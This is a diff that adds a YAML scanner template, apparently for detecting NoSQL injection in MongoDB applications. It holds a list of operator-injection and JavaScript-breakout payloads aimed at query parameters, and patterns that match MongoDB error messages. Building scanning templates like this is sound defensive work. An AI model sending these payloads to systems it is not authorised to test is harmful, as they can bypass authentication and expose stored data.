@@ -1,0 +1,38 @@
+id: nosql-injection
+info:
+  name: "NoSQL Injection"
+  severity: high
+  description: "Detects NoSQL injection via MongoDB operator injection and error messages"
+  tags: [nosql, injection, mongodb, database]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  - '{"$gt":""}'
+  - '{"$ne":""}'
+  - '{"$regex":".*"}'
+  - '{"$where":"1==1"}'
+  - "[$gt]="
+  - "[$ne]="
+  - "[$regex]=.*"
+  - "true, $where: '1 == 1'"
+  - "';return true;var a='"
+  - '{"$gt": -1}'
+  - '[$exists]=true'
+  - '{"$in":["admin"]}'
+  - "1||1==1"
+  - "';return(true);var a='"
+
+matchers:
+  body_patterns:
+    - "(?i)MongoError"
+    - "(?i)mongo.*command.*failed"
+    - '(?i)\$where.*not.*allowed'
+    - "(?i)SyntaxError.*unexpected"
+    - "(?i)ReferenceError"
+    - "(?i)Cannot read propert"
+    - "(?i)BSON"
+    - "(?i)ObjectId\\("
+    - "(?i)mongoose.*validation"
